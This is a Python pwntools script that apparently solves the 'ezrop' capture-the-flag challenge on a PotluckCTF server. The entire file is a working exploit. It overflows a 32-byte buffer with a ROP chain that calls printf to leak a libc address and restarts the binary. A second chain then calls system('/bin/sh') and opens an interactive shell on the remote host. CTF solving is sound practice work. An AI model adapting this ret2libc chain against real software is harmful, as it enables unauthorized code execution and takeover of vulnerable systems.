from pwn import *
#io = process("./ezrop")
io = remote("challenge19.play.potluckctf.com",31337)
libc = ELF("./libc.so.6")

ret = p64(0x4011da)
entry = p64(0x401090)
printf_plt = p64(0x401060)

# leak libc and restart binary
rop  = b"A"*32 + p64(0) # padding + rbp
rop += ret + printf_plt + ret + printf_plt + entry

io.sendlineafter(b"Enter your name:",rop)
io.recv()

libc.address = u64(io.recv(6).ljust(8,b"\x00")) - 2506816 - 0x2000
log.info("LIBC BASE: " + hex(libc.address))


# ret2libc
pop_rdi = p64(libc.address + 0x2a3e5)

rop  = b"A"*32 + p64(0) 
rop += ret + pop_rdi + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols["system"])

#gdb.attach(io,gdbscript="break *0x40120e")
io.sendlineafter(b"Enter your name:",rop)
io.interactive()

